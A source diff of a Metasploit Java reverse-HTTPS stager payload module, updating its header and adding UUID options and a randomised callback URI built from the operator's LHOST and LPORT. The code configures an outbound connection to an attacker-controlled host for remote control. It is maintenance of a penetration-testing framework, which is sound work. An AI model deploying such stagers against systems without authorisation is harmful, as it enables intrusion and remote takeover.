@@ -1,17 +1,19 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
+require 'msf/core/payload/uuid_options'
 
 module Metasploit3
 
+  CachedSize = 6307
+
   include Msf::Payload::Stager
   include Msf::Payload::Java
+  include Msf::Payload::UUIDOptions
 
   def initialize(info = {})
     super(merge_info(info,
@@ -42,12 +44,21 @@ module Metasploit3
   end
 
   def config
+    # Default URL length is 30-256 bytes
+    uri_req_len = 30 + rand(256-30)
+
+    # Generate the short default URL if we don't know available space
+    if self.available_space.nil?
+      uri_req_len = 5
+    end
+
     spawn = datastore["Spawn"] || 2
     c =  ""
     c << "Spawn=#{spawn}\n"
     c << "URL=https://#{datastore["LHOST"]}"
     c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    c << "/INITJM\n"
+    c << generate_uri_uuid_mode(:init_java, uri_req_len)
+    c << "\n"
 
     c
   end
